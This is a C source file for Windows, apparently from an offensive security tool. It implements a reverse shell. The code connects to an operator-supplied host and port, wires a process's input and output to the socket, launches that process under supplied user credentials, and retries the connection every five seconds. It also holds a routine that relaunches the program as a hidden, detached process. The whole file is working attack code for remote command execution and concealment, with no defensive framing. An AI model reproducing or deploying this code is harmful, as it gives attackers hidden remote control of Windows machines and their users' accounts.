#include <WinSock2.h>
#include <windows.h>
#include <stdio.h>
#include <userenv.h>
#include <Lmcons.h>

#include "MgArguments.h"
#include "Tools.h"
#include "Message.h"

#include "SocketTools.h"

#define DEFAULT_BUFLEN 1024
#define MAX_ARG_LENGHT 65535

#pragma warning(disable:4996)

BOOL runAS(LPCWSTR lpszUsername, LPCWSTR lpszDomain, LPCWSTR lpszPassword, LPCWSTR appName, STARTUPINFOW si, PROCESS_INFORMATION* ProcessInfo) {
    HANDLE    hToken;
    LPVOID    lpvEnv;
    WCHAR     szUserProfile[256] = L"";
    DWORD     dwSize = sizeof(szUserProfile) / sizeof(WCHAR);
    int retVal = 0;

    if (LogonUserW(lpszUsername, lpszDomain, lpszPassword, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken)) {
        if (CreateEnvironmentBlock(&lpvEnv, hToken, TRUE)) {
            if (GetUserProfileDirectoryW(hToken, szUserProfile, &dwSize)) {
                if (!CreateProcessWithLogonW(lpszUsername, lpszDomain, lpszPassword, LOGON_WITH_PROFILE, NULL, appName, CREATE_UNICODE_ENVIRONMENT, lpvEnv, szUserProfile,&si, ProcessInfo))
                    retVal = DisplayError(L"CreateProcessWithLogonW");
            }else
                retVal = DisplayError(L"GetUserProfileDirectory");
            if (!DestroyEnvironmentBlock(lpvEnv))
                retVal =  DisplayError(L"DestroyEnvironmentBlock");
        }else
            retVal = DisplayError(L"CreateEnvironmentBlock");
        CloseHandle(hToken);
    } else
        retVal = DisplayError(L"LogonUser");
    return retVal;
}

BOOL RunShellAs(Arguments listAgrument) {
    BOOL exitPorcess = FALSE;
    struct sockaddr_in sAddr;

    char* ipAddress = (char*)calloc(IP_ADDRESS_SIZE, sizeof(char));
    if (ipAddress == NULL)
        return FALSE;
    sprintf_s(ipAddress, IP_ADDRESS_SIZE, "%ws", listAgrument.host);

    sAddr.sin_family = AF_INET;
    sAddr.sin_addr.s_addr = inet_addr(ipAddress);
    sAddr.sin_port = htons(listAgrument.port);

    printMsg(STATUS_INFO, LEVEL_DEFAULT, "Try to connect to server\n");
    while (!exitPorcess) {
        SOCKET mySocket = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (GROUP)0, (DWORD)0);
        if (mySocket != SOCKET_ERROR) {
            if (WSAConnect(mySocket, (SOCKADDR*)&sAddr, sizeof(sAddr), NULL, NULL, NULL, NULL) != SOCKET_ERROR) {
                STARTUPINFOW StartupInfo;
                PROCESS_INFORMATION ProcessInfo;
                BOOL retVal;

                printMsg(STATUS_OK, LEVEL_DEFAULT, "Connected to: %s:%i\n", ipAddress, listAgrument.port);
                SendInitInfo(mySocket);

                memset(&StartupInfo, 0, sizeof(STARTUPINFOW));
                memset(&ProcessInfo, 0, sizeof(PROCESS_INFORMATION));
                StartupInfo.cb = sizeof(STARTUPINFOW);
                StartupInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                StartupInfo.hStdInput = (HANDLE)mySocket;
                StartupInfo.hStdOutput = (HANDLE)mySocket;
                StartupInfo.hStdError = (HANDLE)mySocket;

                retVal = runAS(listAgrument.lpszUsername, listAgrument.lpszDomain, listAgrument.lpszPassword,
                    listAgrument.Process, StartupInfo, &ProcessInfo);
                if (retVal == 0) {
                    WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
                    printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Process shutdown !\n");
                    CloseHandle(ProcessInfo.hProcess);
                    CloseHandle(ProcessInfo.hThread);
                }else
                    exitPorcess = TRUE;
            }
            closesocket(mySocket);
        }
        Sleep(5 * SECOND);
    }
    free(ipAddress);
    return TRUE;
}

BOOL RunProcessDetached(int argc, WCHAR* argv[]) {
    WCHAR szExeFileName[MAX_PATH * sizeof(WCHAR)];
    GetModuleFileNameW(NULL, szExeFileName, MAX_PATH * sizeof(WCHAR));
    printMsg(STATUS_INFO, LEVEL_VERBOSE, "Process %ws\n", szExeFileName);

    WCHAR* argBuffer = (WCHAR*)calloc(MAX_ARG_LENGHT, sizeof(WCHAR));
    if (argBuffer == NULL)
        return FALSE;
    int bufferSize = swprintf(argBuffer, MAX_ARG_LENGHT, L"%s ", szExeFileName);
    for (int i = 1; i < argc && bufferSize < MAX_ARG_LENGHT; i++)
        if (wcscmp(argv[i], L"detached") != 0)
            bufferSize += swprintf(argBuffer + (bufferSize), MAX_ARG_LENGHT, L"%s ", argv[i]);


    printMsg(STATUS_INFO, LEVEL_VERBOSE, "Args %ws\n", argBuffer);
    if (bufferSize > 10) {
        STARTUPINFOW StartupInfo;
        PROCESS_INFORMATION ProcessInfo;

        ZeroMemory(&StartupInfo, sizeof(STARTUPINFOW));
        ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
        StartupInfo.cb = sizeof(STARTUPINFOW);
        StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
        StartupInfo.wShowWindow = SW_HIDE;

        if (CreateProcessW(szExeFileName, argBuffer, NULL, NULL, FALSE, CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &StartupInfo, &ProcessInfo)) {
            printMsg(STATUS_INFO, LEVEL_DEFAULT, "Process Started (PID: %i)\n", GetProcessId(ProcessInfo.hProcess));
            CloseHandle(ProcessInfo.hThread);
            CloseHandle(ProcessInfo.hProcess);
            free(argBuffer);
            return TRUE;
        } else
            DisplayError(L"CreateProcessW");
    }
    free(argBuffer);
    return FALSE;
}